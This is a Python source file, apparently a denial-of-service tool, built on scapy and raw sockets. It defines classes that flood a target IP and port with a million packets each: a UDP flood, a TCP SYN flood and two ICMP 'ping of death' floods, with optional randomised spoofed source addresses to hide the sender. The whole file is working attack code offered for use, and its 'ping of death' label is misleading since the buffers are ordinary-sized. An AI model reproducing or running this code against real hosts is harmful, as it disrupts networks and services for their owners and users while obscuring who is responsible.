#!/usr/bin/python
from scapy.all import *
import socket
import random



def IsValidIpv4Address(address):               # Validation of Ip Address
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:
        return False
    return True

def IsValidPort(port):                       # Validation of Port
    for i in range (1, 65536):
        if int(port) == i:
            return True

    return False


class InPut:                               # the (Ip, Port, AddressSpoffer)  will saved in this class
    def __init__(self):
        self.TargetIp    = "10.10.10.10"
        self.TargetPort  = 1
        self.Spoof       = False



class RandomIp:                        # Create a Random Ip  for Ip Spoofer
    def __init__(self):
        self.ip = [100, 100, 10, 10]
        self.d = '.'
        self.ip[0]    = str(random.randrange(10, 197))   # random first octal in ip  between 10 - 197
        self.ip[1]    = str(random.randrange(0, 255))   # random second octal in ip  between 0 - 255
        self.ip[2]    = str(random.randrange(0, 255))  # random third octal in ip  between 0 - 255
        self.ip[3]    = str(random.randrange(1, 254)) # random last octal in ip  between 1 - 254
        # dump the four octal to one string
        self.RandomIp = self.ip[0] \
                        + self.d + \
                        self.ip[1] \
                        + self.d + \
                        self.ip[2] \
                        + self.d + \
                        self.ip[3]


class Buffer:  						      #Create a buffer for packets
    def __init__(self):					       #
        self.UDPfloodBuffer     = random._urandom(1024) 	# Create a UDP FLOOD buffer with 1024 bit
        self.PingOfDeathBuffer  = random._urandom(1472)          #ping of death v1 Buffer 
        self.PingOfDeath1Buffer = random._urandom(1480)      #Ping of Death v2  Buffer

class RandomPort:					# Create a Random Port
    def __init__(self):                                  #
        self.RandomPort = random.randint(1001, 65535)     # random between 1001 - 65535

class PingOfDeathSocket(Buffer, InPut):

    def __init__(self):

        self.TargetIp     = InPut.TargetIp              #get Target ip thats stored in class input
        self.B            = Buffer()                    #Refresh The Buffer
        self.Buffer       = self.B.PingOfDeath1Buffer   #Store Ping of Death Buffer to variable

        self.s  = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        #self.s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        for i in xrange(1000000):
            #self.s  = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            #self.s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            self.s.sendto(self.Buffer, (self.TargetIp, 7))

        self.s.close()




class PingOfDeath(RandomIp, Buffer, InPut):            # Ping of Death unit
    def __init__(self):

        self.TargetIp     = InPut.TargetIp             # get Target ip thats stored in class input
        self.Spoof        = InPut.Spoof			# get Target port thats stored in class input
        self.B            = Buffer()                    #Refresh The Buffer
        self.Buffer       = self.B.PingOfDeathBuffer   #Store Ping of Death Buffer to variable

        if self.Spoof:         				       # if the Address Spoof is True
            for i in xrange(1000000):				#  loop  with 10000000 circles
                self.RandomIps    = RandomIp()                   #refresh Random Ip
                self.RandomIp     = self.RandomIps.RandomIp       #Store the ip in variable
                #self.B            = Buffer()			   #Refresh The Buffer
                #self.Buffer       = self.B.PingOfDeathBuffer        #Store Ping of Death Buffer to variable
                send(					  	     #Send Packet
                    IP(
                        src=self.RandomIp,
                        dst=self.TargetIp
                    )/
                    ICMP(
                    ) /
                    (
                        self.Buffer		# Total Packet Buffer is 1514 bit, 1472 is random , 32 IpHeader and 10 from socket
                    )
                )

        else:							    #if Address Spoof is Flase
            for i in xrange(1000000):                              # loop  with 10000000 circles
                self.RandomIps    = RandomIp()			  #refresh Random Ip
                self.RandomIp     = self.RandomIps.RandomIp  	 #Store the ip in variable
                self.B            = Buffer()			#Refresh The Buffer
                self.Buffer       = self.B.PingOfDeathBuffer   #Store Ping of Death Buffer to variable
                send(					      #Send Packet
                    IP(
                        dst=self.TargetIp
                    )/
                    ICMP(

                    )/
                    (
                        self.Buffer		# Total Packet Buffer is 1514 bit, 1472 is random , 32 IpHeader and 10 from socket
                    )
                )


class UDPflood(Buffer, InPut):                                       # UDP FLOOD UNIT
    def __init__(self):

        self.TargetIp     = InPut.TargetIp				# get Target ip thats stored in class input
        self.TargetPort   = int(InPut.TargetPort)
        # get Target port thats stored in class input
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		  # Open Socket Connection,
        self.B = Buffer()  # Refresh Buffer
        self.Buffer = self.B.UDPfloodBuffer  # Store the Udp Buffer to variable

        for i in xrange(1000000):				           # loob with 1000000 circles

            sock.sendto(self.Buffer,						# Send the buffer
                        (self.TargetIp, self.TargetPort))			 #
        sock.close()							   	  # Close Socket Connection
        #will be closed after(1000000)circles,to increase speed


class SYNflood(RandomIp, RandomPort, InPut):			# SYN Flood Unit
    def   __init__(self):

        self.TargetIp     = InPut.TargetIp			# get Target ip thats stored in class input
        self.TargetPort   = int(InPut.TargetPort)		 #get Target ip thats stored in class input
        self.SPOOF        = InPut.Spoof				  #get Target ip thats stored in class input
        self.Flag         = "S"					   # the S flag , is SYN
        #
        if self.SPOOF:						     # if Address Spoof is Truee
            for i in xrange(1000000):				      # Loop with 1000000 circles
                self.RandomIps    = RandomIp()			       # Refresh Random Ip
                self.RandomIp     = self.RandomIps.RandomIp		# Get Ip from Random Ip
                self.srcPort      = RandomPort()			 # Refresh Random Port
                self.RandomPort   = self.srcPort.RandomPort		  #Get Port From Random Port
                #Send The SYN request
                send(
                    IP(
                        src=self.RandomIp,
                        dst=self.TargetIp
                    )/
                    TCP(
                        sport=self.RandomPort,
                        dport=self.TargetPort,
                        flags=self.Flag
                    )
                )
        else:									# If Address Spoof is False
            for i in xrange(1000000):					       # Loop with 1000000 circles
                self.RandomIps    = RandomIp()				      # Refresh Random Ip
                self.RandomIp     = self.RandomIps.RandomIp		     # Get Ip from Random Ip
                self.srcPort      = RandomPort()			    # Refresh Random Port
                self.RandomPort   = self.srcPort.RandomPort		   # Get Port from Random Port
                send(							  # Send the SYN request
                    IP(
                        dst=self.TargetIp
                    )/
                    TCP(
                        sport=self.RandomPort,
                        dport=self.TargetPort,
                        flags=self.Flag
                    )
                )


